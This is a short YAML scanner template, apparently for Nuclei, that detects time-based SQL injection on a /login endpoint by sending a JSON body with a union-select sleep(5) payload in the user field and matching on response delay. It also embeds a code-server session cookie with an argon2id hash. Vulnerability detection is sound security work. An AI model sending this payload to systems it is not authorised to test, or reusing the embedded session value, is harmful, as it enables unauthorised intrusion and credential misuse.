id: sql-time-based-post
info:
  name: SQL Injection - Time-Based via POST JSON
  author: appseclabs
  severity: high
  description: >
    Time-based SQL injection detected via delayed response when injecting `sleep()` no campo `user`.
  tags: sqli, json, injection

requests:
  - method: POST
    path:
      - "{{BaseURL}}/login"

    headers:
      Content-Type: application/json
      Cookie: code-server-session=$argon2id$v=19$m=65536,t=3,p=4$WB9J+9AA5phRkcyUvINowQ$+G524usDFpK+x6HM4o8+SGjWXKWvWdYESFSvMlWc840

    body: |
      {
        "user": "-1' union select 1,2,sleep(5) -- ",
        "pass": "password"
      }

    matchers:
      - type: dsl
        name: response-delay
        dsl:
          - duration>=5
        condition: and
